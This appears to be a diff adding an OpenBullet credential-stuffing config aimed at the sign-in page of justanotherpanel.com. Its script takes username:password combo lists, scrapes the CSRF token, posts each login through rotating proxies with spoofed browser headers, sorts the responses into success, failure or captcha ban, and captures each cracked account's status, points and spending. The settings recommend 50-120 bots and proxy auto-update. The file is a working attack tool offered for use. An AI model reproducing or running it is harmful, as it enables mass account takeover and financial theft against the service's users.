@@ -1,0 +1,102 @@
+[SETTINGS]
+{
+  "Name": "JustanotherPanel.com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-05-10T06:48:09.7986831-07:00",
+  "AdditionalInfo": "Needs Proxy (Use Auto Update Proxy) | Suggested Bot: 50_120 | Full Capture | Combo Type: User:Pass | CPM: 30_500",
+  "Author": "@H0S31N",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "UserPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#US FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+#PS FUNCTION URLEncode "<PASS>" -> VAR "PS" 
+
+#GET REQUEST GET "https://justanotherpanel.com/signin" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#TOKEN PARSE "<SOURCE>" LR "type=\"hidden\" name=\"_csrf\" value=\"" "\">" -> VAR "Token" 
+
+#Ento FUNCTION URLEncode "<Token>" -> VAR "TO" 
+
+#Lenght FUNCTION Length "_csrf=<TO>&LoginForm%5Busername%5D=<US>&LoginForm%5Bpassword%5D=<PS>" -> VAR "Lenght" 
+
+#POST REQUEST POST "https://justanotherpanel.com/signin" 
+  CONTENT "_csrf=<TO>&LoginForm%5Busername%5D=<US>&LoginForm%5Bpassword%5D=<PS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: fa,en;q=0.9,en-US;q=0.8" 
+  HEADER "Cache-Control: max-age=0" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: <Lenght>" 
+  HEADER "Host: justanotherpanel.com" 
+  HEADER "Origin: https://justanotherpanel.com" 
+  HEADER "Referer: https://justanotherpanel.com/" 
+  HEADER "Sec-Fetch-Dest: document" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-Site: same-origin" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "SPENDING" 
+    KEY "Logout" 
+  KEYCHAIN Failure OR 
+    KEY "Incorrect username or password" 
+  KEYCHAIN Ban OR 
+    KEY "Please solve captcha" 
+
+#ACCOUNT_STATUS PARSE "<SOURCE>" LR "<h3><span>ACCOUNT STATUS</span>" "</h3>" CreateEmpty=FALSE -> CAP "ACCOUNT STATUS" 
+
+#ACCOUNT_POINTS PARSE "<SOURCE>" LR "<h3><span>ACCOUNT POINTS</span> <value id=\"userPoint\">" "</value> ≈ <value " CreateEmpty=FALSE -> CAP "ACCOUNT POINTS" 
+
+#Amount PARSE "<SOURCE>" LR "<h3><span>ACCOUNT SPENDING</span>" "</h3>" CreateEmpty=FALSE -> CAP "Amount" 
+
